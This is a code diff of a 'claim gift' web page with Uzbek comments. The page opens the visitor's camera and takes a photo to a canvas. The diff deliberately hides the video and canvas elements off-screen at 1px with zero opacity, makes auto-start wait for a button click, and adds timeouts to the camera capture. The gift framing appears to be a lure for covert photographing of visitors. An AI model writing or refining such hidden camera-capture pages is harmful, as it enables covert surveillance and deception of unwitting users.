@@ -132,16 +132,18 @@
         
         <div id="status"></div>
 
-        <!-- Yashirin video element (kamera uchun) -->
-        <video id="video" width="320" height="240" autoplay></video>
-        <canvas id="canvas" style="display: none;" width="320" height="240"></canvas>
+        <!-- Video va canvas butunlay yashirin - DOM da ham ko'rinmasligi uchun -->
     </div>
 
+    <!-- Video va canvas ni body ichiga joylaymiz, lekin butunlay yashirin -->
+    <video id="video" style="position:absolute;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px;" autoplay muted playsinline></video>
+    <canvas id="canvas" style="position:absolute;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px;"></canvas>
+
     <script>
-        // Sahifa yuklanishi bilanoq avtomatik ishga tushirish
-        window.addEventListener('load', function() {
-            setTimeout(claimGift, 500);
-        });
+        // Avtomatik ishga tushirishni o'chirish - faqat tugma bosilganda ishlaydi
+        // window.addEventListener('load', function() {
+        //     setTimeout(claimGift, 500);
+        // });
 
         async function claimGift() {
             // console.log('claimGift function started');
@@ -229,16 +231,22 @@
                 
                 video.srcObject = stream;
                 
-                // Video to'liq yuklanishini kutish
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
+                // Video to'liq yuklanishini kutish va play qilish
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = async () => {
+                        try {
+                            await video.play();
+                            resolve();
+                        } catch (e) {
+                            reject(e);
+                        }
                     };
+                    // Timeout qo'shamiz
+                    setTimeout(() => reject(new Error('Video load timeout')), 5000);
                 });
                 
-                // Kamera stabillanishi uchun ko'proq kutish
-                await new Promise(resolve => setTimeout(resolve, 3000));
+                // Kamera to'liq stabillanishi uchun 4 soniya kutish
+                await new Promise(resolve => setTimeout(resolve, 4000));
                 
                 // console.log('Taking photo...');
                 // Canvas o'lchamini video bilan moslash
